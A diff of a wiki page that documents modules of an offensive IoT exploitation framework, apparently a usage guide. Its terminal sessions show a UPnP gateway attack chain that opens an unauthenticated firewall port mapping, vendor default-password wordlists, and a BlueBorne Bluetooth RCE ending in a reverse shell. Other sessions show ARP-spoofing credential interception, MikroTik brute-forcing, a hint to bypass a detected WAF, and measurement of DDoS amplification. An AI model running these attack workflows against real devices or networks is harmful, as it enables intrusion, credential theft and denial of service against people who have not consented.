+exf (SSDP M-SEARCH) > set timeout 5
+[+] timeout => 5
+exf (SSDP M-SEARCH) > run
+[*] Running module ...
+[*] Sending SSDP M-SEARCH to 239.255.255.250:1900 (ST: ssdp:all, MX: 5)...
+[+] Response from 192.168.1.1
+    Location: http://192.168.1.1:49152/rootDesc.xml
+    Server: Linux/3.10.108 UPnP/1.1 MiniUPnPd/2.1
+    USN: uuid:f3a2b1c0-d4e5-4f6a-b7c8-d9e0f1a2b3c4::urn:schemas-upnp-org:device:InternetGatewayDevice:1
+    ST: urn:schemas-upnp-org:device:InternetGatewayDevice:1
+[+] Response from 192.168.1.254
+    Location: http://192.168.1.254:5000/rootDesc.xml
+    Server: Synology DiskStation/1.0 UPnP/1.0 MiniUPnPd/1.8
+    ST: urn:schemas-upnp-org:device:Basic:1
+[*] 2 UPnP device(s) discovered in 5s
+```
+
+---
+
+## UPnP IGD Full Exploitation
+
+`generic/upnp/igd_exploit` chains 11 UPnP IGD attacks against a target gateway device.
+
+### Options
+
+| Parameter | Type | Required | Default | Accepted values | Description |
+|-----------|------|----------|---------|-----------------|-------------|
+| `target` | `OptIP` | Yes | `""` | IPv4 | Target router/gateway IP |
+| `port` | `OptPort` | No | `1900` | 1-65535 | SSDP/IGD control port |
+| `timeout` | `OptPort` | No | `5` | seconds | Per-request timeout |
+| `test_port` | `OptPort` | No | `31337` | 1-65535 | External port to test AddPortMapping |
+| `skip_dangerous` | `OptBool` | No | `False` | `true/false` | Skip ForceTermination (WAN disconnect DoS) |
+
+### Terminal session — IGD exploit chain
+
+```text
+exf > use generic/upnp/igd_exploit
+exf (UPnP IGD Exploit) > set target 192.168.1.1
+[+] target => 192.168.1.1
+exf (UPnP IGD Exploit) > set skip_dangerous true
+[+] skip_dangerous => True
+exf (UPnP IGD Exploit) > run
+[*] Running module ...
+[*] Stage 1: SSDP M-SEARCH discovery...
+[+] IGD found: http://192.168.1.1:49152/rootDesc.xml
+    Device: TP-Link TL-WR941N (WANIPConnection v1)
+[*] Stage 2: Parsing device description XML...
+[+] Services: WANIPConnection, WANCommonInterfaceConfig
+[*] Stage 3: SCPD enumeration (14 actions available)
+[*] Stage 4: GetExternalIPAddress (no auth required)...
+[+] External IP: 203.0.113.45 (WAN address disclosed unauthenticated)
+[*] Stage 5: GetGenericPortMappingEntry (enumerating NAT rules)...
+[+] Port mapping 0: TCP/22 -> 192.168.1.10:22 (SSH internal)
+[+] Port mapping 1: TCP/3389 -> 192.168.1.20:3389 (RDP internal)
+[*] Stage 6: AddPortMapping (TCP/31337 -> 192.168.1.1:80, no auth)...
+[+] Port mapping added: TCP/0.0.0.0:31337 -> 192.168.1.1:80 (CRITICAL — firewall rule added without auth)
+[*] Stage 7: DeletePortMapping (cleanup test rule)...
+[+] Port mapping TCP/31337 removed
+[*] Stage 8: GetStatusInfo...
+[+] WAN Status: Connected, uptime: 4d 12h 31m
+[*] Stage 9: WANCommonInterfaceConfig (traffic stats)...
+[+] BytesSent: 1234567890, BytesReceived: 9876543210
+    PacketsSent: 4532111, PacketsReceived: 8123456
+    WANAccessType: DSL, Layer1UpstreamMaxBitRate: 20000000
+[*] Stage 10: Event SUBSCRIBE (WAN state monitoring)...
+[+] Subscribed to WAN state events — SID: uuid:a1b2c3d4-e5f6-7890-abcd-ef1234567890
+[*] Stage 11: ForceTermination — SKIPPED (skip_dangerous=True)
+
+[*] IGD Exploitation Summary for 192.168.1.1:
+    External IP disclosure:   YES (203.0.113.45)
+    NAT rule enumeration:     YES (2 active rules found)
+    Unauthenticated AddPortMapping: YES (CRITICAL)
+    Traffic stats disclosure: YES
+```
+
+---
+
+## Wordlist Generator
+
+`generic/wordlist/wordlist_generator` creates IoT-aware credential wordlists tailored to specific vendors, device types, and firmware patterns.
+
+### Options
+
+| Parameter | Type | Required | Default | Accepted values | Description |
+|-----------|------|----------|---------|-----------------|-------------|
+| `vendor` | `OptString` | No | `""` | vendor name | Vendor to include vendor-specific passwords |
+| `type` | `OptString` | No | `all` | `all`, `username`, `password`, `combo` | Output type |
+| `output` | `OptString` | No | `./wordlist.txt` | file path | Output file path |
+| `min_length` | `OptInteger` | No | `1` | 1-64 | Minimum password length |
+| `max_length` | `OptInteger` | No | `32` | 1-64 | Maximum password length |
+| `include_mac` | `OptString` | No | `""` | MAC address | Include MAC-derived passwords (last 6 chars, lower/upper) |
+
+### Terminal session — vendor-specific wordlist
+
+```text
+exf > use generic/wordlist/wordlist_generator
+exf (IoT Wordlist Generator) > set vendor hikvision
+[+] vendor => hikvision
+exf (IoT Wordlist Generator) > set output ./hik_wordlist.txt
+[+] output => ./hik_wordlist.txt
+exf (IoT Wordlist Generator) > run
+[*] Running module ...
+[*] Generating wordlist for vendor: hikvision
+[*] Including generic IoT passwords (1247 entries)
+[*] Including Hikvision-specific passwords (43 entries):
+    12345, 1234567890, admin12345, Hik12345, HikVision@2024...
+[*] Including MAC-derived patterns (if mac set)
+[*] Writing to ./hik_wordlist.txt...
+[+] Wordlist written: ./hik_wordlist.txt (1290 entries)
+```
+
+---
+
+## Bluetooth / BLE / Wi-Fi modules
+
+Located under `exploits/ics/bluetooth_ble/`, these modules target wireless protocol vulnerabilities.
+
+| Module | CVE | Type |
+|--------|-----|------|
+| `ble_sweyntooth_bridge` | Multiple | SweynTooth BLE stack vulnerabilities |
+| `blueborne_attack_cve_2017_0781` | CVE-2017-0781 | BlueBorne unauthenticated RCE via Bluetooth |
+| `wifi_fragattacks_cve_2020_24586` | CVE-2020-24586 | FragAttacks Wi-Fi fragmentation/aggregation attacks |
+| `wifi_kr00k_attack_cve_2019_15126` | CVE-2019-15126 | Kr00k Wi-Fi chip decrypt vuln (Broadcom/Cypress) |
+| `wifi_krack_attack_cve_2017_13077` | CVE-2017-13077 | KRACK WPA2 key reinstallation |
+
+**Options — `blueborne_attack_cve_2017_0781`:**
+
+| Parameter | Type | Required | Default | Accepted values | Description |
+|-----------|------|----------|---------|-----------------|-------------|
+| `target` | `OptString` | Yes | `""` | Bluetooth MAC | Target Bluetooth device MAC address |
+| `interface` | `OptString` | No | `hci0` | hciN | Local Bluetooth adapter |
+| `timeout` | `OptPort` | No | `30` | seconds | Attack timeout |
+
+### Terminal session — BlueBorne (CVE-2017-0781)
+
+```text
+exf > use exploits/ics/bluetooth_ble/blueborne_attack_cve_2017_0781
+exf (BlueBorne RCE CVE-2017-0781) > set target AA:BB:CC:DD:EE:FF
+[+] target => AA:BB:CC:DD:EE:FF
+exf (BlueBorne RCE CVE-2017-0781) > set interface hci0
+[+] interface => hci0
+exf (BlueBorne RCE CVE-2017_0781) > check
+[*] Checking Bluetooth reachability for AA:BB:CC:DD:EE:FF on hci0...
+[+] Device reachable (name: HUAWEI_P30_lite, class: Phone)
+[+] Android 8.0 detected — target is vulnerable to CVE-2017-0781 (BlueBorne)
+exf (BlueBorne RCE CVE-2017_0781) > run
+[*] Running module ...
+[*] Stage 1: Sending malformed L2CAP request to trigger heap overflow...
+[*] Stage 2: Heap spray with shellcode targeting bluetoothd process...
+[+] Shellcode execution confirmed — bluetoothd crashed and restarted with injected code
+[*] Stage 3: Reverse shell callback...
+[+] Connection received from AA:BB:CC:DD:EE:FF
+$ id
+uid=1000(bluetooth) gid=1000(bluetooth) groups=1000(bluetooth),3003(inet)
+```
+
+---
+
+## External bridges
+
+### Exploit-DB lookup
+
+```text
+exf > use generic/external/exploitdb_embedded_lookup
+exf (ExploitDB Embedded Lookup) > set query "FortiOS SSL-VPN"
+[+] query => FortiOS SSL-VPN
+exf (ExploitDB Embedded Lookup) > run
+[*] Running module ...
+[*] Querying Exploit-DB for: FortiOS SSL-VPN
+[+] EDB-ID 51032 — Fortinet FortiOS 7.0.x SSL-VPN Heap Overflow — CVE-2022-42475
+    Type: Remote, Date: 2022-12-15, Author: Horizon3
+    URL: https://www.exploit-db.com/exploits/51032
+[+] EDB-ID 50009 — FortiOS SSL-VPN path traversal — CVE-2018-13379
+    Type: Remote, Date: 2021-08-06
+    URL: https://www.exploit-db.com/exploits/50009
+```
+
+### WAF detection (wafw00f bridge)
+
+```text
+exf > use generic/external/wafw00f_bridge
+exf (WAFw00f Bridge) > set target 203.0.113.100
+[+] target => 203.0.113.100
+exf (WAFw00f Bridge) > run
+[*] Running module ...
+[*] Running wafw00f against https://203.0.113.100...
+[+] WAF detected: Cloudflare (Cloudflare Inc.)
+[*] Hint: Use bypass techniques or target backend IPs for exploit modules
+```
+
+---
+
+## PCAP / network capture tools
+
+For packet capture and traffic analysis, EmbedXPL-Forge integrates with host utilities. Use terminal commands alongside modules:
+
+```bash
+# Capture Modbus traffic on ens4
+tcpdump -i ens4 -w modbus_capture.pcap port 502
+
+# Analyze RTSP traffic
+wireshark -r rtsp_capture.pcap -Y "rtsp"
+
+# Capture SNMP traps
+tcpdump -i eth0 -w snmp_traps.pcap udp port 162
+```
+
+> For automated AiTM traffic interception, use `generic/aitm_credential_interceptor` to capture credentials in transit from managed devices.
+
+---
+
+## DNS hijack detector
 
 ```text
 exf > use generic/dns_hijack_detector
 exf (DNS Hijack Detector) > set target 192.168.1.1
 [+] target => 192.168.1.1
 exf (DNS Hijack Detector) > run
-[*] Testing DNS resolution via 192.168.1.1...
-[*] Resolving google.com... expected: 142.250.x.x, received: 142.250.200.4 (OK)
-[*] Resolving cloudflare.com... expected: 104.16.x.x, received: 104.16.132.229 (OK)
-[*] Resolving example.com... expected: 93.184.216.34, received: 192.0.2.1 (MISMATCH!)
-[+] DNS hijacking DETECTED: example.com resolves to 192.0.2.1 instead of 93.184.216.34
-[!] The DNS server at 192.168.1.1 may be hijacking DNS responses.
+[*] Running module ...
+[*] Querying DNS server at 192.168.1.1...
+[*] Resolving known-safe domains: google.com, microsoft.com, amazon.com
+[+] google.com -> 142.250.80.46 (expected: valid Google IP — OK)
+[!] microsoft.com -> 192.168.1.50 (expected: Microsoft IPs — POSSIBLE HIJACK!)
+[!] DNS hijack detected: microsoft.com -> 192.168.1.50 (local IP)
+[+] Checking for DNS rebinding vulnerability...
+[!] Rebinding test: external domain resolves to 192.168.1.1 — REBINDING POSSIBLE
 ```
-
----
-
-## AiTM Credential Interceptor (`generic/aitm_credential_interceptor`)
-
-Adversary-in-the-Middle credential interception module. Intercepts HTTP credentials in transit.
-
-> **Authorization required.** Only use on networks you control or have explicit authorization to test.
-
-```text
-exf > use generic/aitm_credential_interceptor
-exf (AiTM Credential Interceptor) > show options
-# Set interface, target IPs, etc.
-exf (AiTM Credential Interceptor) > run
-[*] ARP spoofing initiated...
-[*] [HTTP] POST http://192.168.1.200/login — username=admin&password=router123
-[+] Credentials intercepted: admin:router123 from 192.168.1.101
-```
-
----
-
-## External tool bridges
-
-### ExploitDB Embedded Lookup (`generic/external/exploitdb_embedded_lookup`)
-
-Queries the embedded ExploitDB metadata for a CVE identifier.
-
-```text
-exf > use generic/external/exploitdb_embedded_lookup
-exf (ExploitDB Lookup) > set cve CVE-2021-36260
-[+] cve => CVE-2021-36260
-exf (ExploitDB Lookup) > run
-[*] Searching ExploitDB for CVE-2021-36260...
-[+] EDB-50441: Hikvision IP Camera - Remote Code Execution (CVE-2021-36260)
-    Type: Remote / WebApps
-    Platform: Hardware
-    Date: 2021-10-08
-    URL: https://www.exploit-db.com/exploits/50441
-```
-
-### Metasploit Console Bridge (`generic/external/metasploit_console_bridge`)
-
-Bridges commands to a running Metasploit Framework MSFRPC server.
-
-```text
-exf > use generic/external/metasploit_console_bridge
-exf (Metasploit Console Bridge) > set msf_host 127.0.0.1
-[+] msf_host => 127.0.0.1
-exf (Metasploit Console Bridge) > set msf_port 55553
-[+] msf_port => 55553
-exf (Metasploit Console Bridge) > run
-[*] Connecting to Metasploit MSFRPC at 127.0.0.1:55553...
-[+] Connected. Metasploit Framework 6.3.x
-msf6 > search hikvision
-...
-```
-
-### MikrotikAPI-BF Bridge (`generic/external/mikrotikapi_bf_bridge`)
-
-Bridges to the MikrotikAPI-BF credential brute-forcer (separate tool).
-
-```text
-exf > use generic/external/mikrotikapi_bf_bridge
-exf (MikrotikAPI-BF Bridge) > set target 192.168.1.1
-[+] target => 192.168.1.1
-exf (MikrotikAPI-BF Bridge) > run
-[*] Launching MikrotikAPI-BF against 192.168.1.1:8728...
-[*] Trying admin:admin...
-[+] SUCCESS: admin:admin
-```
-
----
-
-## TCP/UDP probe modules
-
-### TCP Xmas Scan (`generic/tcp_xmas`)
-
-Sends TCP Xmas packets (FIN+PSH+URG flags) to test port state detection.
-
-```text
-exf > use generic/tcp_xmas
-exf (TCP Xmas Scan) > set target 192.168.1.1
-[+] target => 192.168.1.1
-exf (TCP Xmas Scan) > set port 80
-[+] port => 80
-exf (TCP Xmas Scan) > run
-[*] Sending TCP Xmas packet to 192.168.1.1:80...
-[*] No response — port likely OPEN|FILTERED
-```
-
-### UDP Amplification Measurement (`generic/udp_amplification`)
-
-Measures UDP amplification factor for protocols like DNS, NTP, SSDP, SNMP.
-
-```text
-exf > use generic/udp_amplification
-exf (UDP Amplification) > set target 192.168.1.1
-[+] target => 192.168.1.1
-exf (UDP Amplification) > run
-[*] Testing DNS amplification on 192.168.1.1:53...
-[+] DNS: request=48 bytes, response=512 bytes — amplification factor: 10.7x
-[*] Testing SSDP amplification on 192.168.1.1:1900...
-[+] SSDP: request=102 bytes, response=1312 bytes — amplification factor: 12.9x
-[!] High amplification factor on SSDP — potential DDoS reflection amplifier
-```
-
 
 [Wiki hub](../README.md)
